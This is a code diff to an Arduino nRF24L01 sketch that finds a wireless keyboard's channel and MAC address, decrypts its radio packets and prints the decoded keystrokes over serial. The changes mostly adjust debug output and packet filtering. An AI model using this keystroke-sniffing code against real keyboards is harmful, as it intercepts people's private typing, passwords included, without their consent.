@@ -4,6 +4,7 @@
 #include "nRF24L01.h"
 #include "RF24.h"
 
+#define DEBUG_MODE 0
 #define RADIO_CE_PIN 9
 #define RADIO_CSN_PIN 10
 #define SERIAL_BAUDRATE 115200
@@ -28,7 +29,9 @@ void decrypt_packet(uint8_t* p)
 
 void process_packet(uint8_t* packet)
 {
+  if (packet[0] != 0x0A) return; 
   if(packet[9] == 0) return;
+  if(packet[1] != 0x78) return;
   
   uint16_t sequence = (packet[5] << 8) + packet[4];
   if (sequence == last_sequence) return;
@@ -75,11 +78,11 @@ void process_letter(char meta_value, char key)
 {
   char letter = hid_decode(key, meta_value);
   last_letter = (meta_value << 8) + key;
-  //Serial.print(" C: ");
   Serial.print(letter);
-  //Serial.print(" (");
-  //Serial.print(key, HEX);
-  //Serial.print(")");
+  if(!DEBUG_MODE) return;
+  Serial.print("(");
+  Serial.print(key, HEX);
+  Serial.print(")");
 }
 
 uint8_t flush_rx(void)
@@ -103,15 +106,7 @@ uint8_t write_to_nrf24l01_register(uint8_t reg, uint8_t value)
 
 void debug_print_packet(uint8_t* packet)
 {
-  return;
-  Serial.println("-PKT START-");
-  for (int j = 0; j < PACKET_SIZE; j++)
-  {
-    Serial.print(" ");
-    Serial.print(j);
-    if(j < 10) Serial.print(" ");
-    Serial.print(" |");
- }
+  if(!DEBUG_MODE) return;
   Serial.println("");
   Serial.print(millis());
   Serial.print(" | ");
@@ -122,7 +117,6 @@ void debug_print_packet(uint8_t* packet)
     Serial.print(packet[j], HEX);
     Serial.print(" |");
   }
-  Serial.println("-PKT END-");
 }
 
 void scan()
@@ -141,13 +135,14 @@ void scan()
     if (channel > 80)
       channel = 3;
 
+    Serial.println("");
     Serial.print("Scanning channel ");
     Serial.print(2400 + channel);
-    Serial.println(".");
+    Serial.print(".");
     radio.setChannel(channel);
 
     channel_start_scan_time = millis();
-    while (millis() - channel_start_scan_time < 500)
+    while (millis() - channel_start_scan_time < 1000)
     {      
       if(radio.available())
       {
@@ -166,9 +161,10 @@ void scan()
             // Check if the packet type is 0x78 which is a keystroke or 0x38 which is idle (key is held down). 
             if (packet[7] << 1 == 0x38 || packet[7] << 1 == 0x78) 
             {
+              Serial.println("");
               Serial.print("Keyboard on channel ");
               Serial.print(channel);
-              Serial.println(".");
+              Serial.print(".");
               EEPROM.write(EEPROM_LAST_CHANNEL_VALUE_ADDRESS, channel);
 
               keyboard_mac_address = 0;
@@ -178,13 +174,13 @@ void scan()
                 keyboard_mac_address <<= 8;
               }
               keyboard_mac_address += packet[4]; // We know the first byte is 0xCD (Note: addressing is LSB first).
-              Serial.print("Mac Address: ");
+              Serial.print(" (Mac Address: ");
               Serial.print(packet[0], HEX);
               Serial.print(packet[1], HEX);
               Serial.print(packet[2], HEX);
               Serial.print(packet[3], HEX);
               Serial.print(packet[4], HEX);
-              Serial.println(".");
+              Serial.print(")");
               write_to_nrf24l01_register(0x03, 0x03);  // SETUP_AW - change address width back to be 5 bytes [Page 54]
               return;
             }
@@ -200,7 +196,7 @@ void setup()
 {
   Serial.begin(SERIAL_BAUDRATE);
   radio.begin();
-  Serial.println("Starting.");
+  Serial.print("Starting.");
   channel = EEPROM.read(EEPROM_LAST_CHANNEL_VALUE_ADDRESS);
   
   radio.setAutoAck(false);
@@ -214,6 +210,7 @@ void setup()
   attachInterrupt(0, radio_data_received, FALLING);
   attachInterrupt(1, scan_button_pressed, FALLING);
   radio.enableDynamicPayloads();
+  radio.setCRCLength(RF24_CRC_16);
   radio.stopListening();
   radio.openReadingPipe(1, keyboard_mac_address);
   radio.startListening();
@@ -235,12 +232,9 @@ void radio_data_received()
     radio.read(&current_packet, PACKET_SIZE);
     flush_rx();
     
-    if (current_packet[0] == 0x0A && current_packet[1] == 0x78)
-    {
-      decrypt_packet(current_packet);
-      debug_print_packet(current_packet);
-      process_packet(current_packet);
-    }
+    decrypt_packet(current_packet);
+    debug_print_packet(current_packet);
+    process_packet(current_packet);
   }
 }
 
